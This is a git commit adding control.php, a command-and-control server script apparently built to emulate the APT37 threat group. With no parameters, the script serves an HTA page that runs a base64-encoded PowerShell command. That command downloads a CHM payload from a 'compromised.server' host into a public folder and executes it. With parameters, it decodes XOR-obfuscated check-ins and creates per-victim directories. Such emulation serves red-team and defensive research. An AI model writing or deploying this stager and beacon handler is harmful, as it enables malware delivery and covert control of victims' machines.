ecc6e9cb57757a108db97ec937c5d04d3983f5c6
hyunjungg <hj351016@gmail.com>
2023-03-16 12:48:31 -0700

    Feat : develop control.php located in server
    + interactive with mshta executed by schtasks
    + interactive with ps executed by chm

---
+++ APT37/Resources/compromised_server/control/control.php
@@ -0,0 +1,70 @@
+<?php
+function xor_calc($string, $key) {
+    $output = '';
+    for($i = 0; $i < strlen($string); $i++) {
+        $output .= chr(ord($string[$i]) ^ $key);
+    }
+    return $output;
+}
+
+if(empty($_GET)){
+    echo '
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Download File</title>
+  <hta:application id="downloadFile" />
+  <script>
+  	var command = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYwBvAG0AcAByAG8AbQBpAHMAZQBkAC4AcwBlAHIAdgBlAHIALwBwAGEAeQBsAG8AYQBkAHMALwBoAGUAbABsAG8ALgBjAGgAbQAgAC0ATwB1AHQARgBpAGwAZQAgAGMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAaABlAGwAbABvAC4AYwBoAG0AIAB8ACAAYwBtAGQALgBlAHgAZQAgAC8AYwAgAGMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAaABlAGwAbABvAC4AYwBoAG0A";
+  	var shell = new ActiveXObject("WScript.Shell");
+	var exec = shell.Exec("powershell.exe -Enc \"" + command + "\"");
+  </script>
+
+  <script>
+  self.close();
+  </script>
+</head>
+<body>
+  <h1>start.html file</h1>
+  
+  
+</body>
+</html>
+';
+
+}else{
+    $encoded_params = array();
+    $encoded_values = array();
+
+    foreach($_GET as $param => $value) {
+      $encoded_params[] = xor_calc($param, 7);
+      $encoded_values[] = xor_calc($value, 7);
+    }
+
+    if (in_array('type', $encoded_params)) {
+        $type_index = array_search('type', $encoded_params);
+        $type = $encoded_values[$type_index];
+    	
+
+        if ($type == "ini"){
+		$data_index = array_search('data', $encoded_params);
+		$data = $encoded_values[$data_index];
+		$dir_path = "../files/". $data;
+		if(!is_dir($dir_path)){
+			mkdir($dir_path,0777,true);
+					
+		}
+
+		echo "date";
+
+        }else if ($type  == "date"){
+		echo "OK";
+        }/*else if (value == "file"){
+
+	}*/
+
+    }
+}
+
+?>
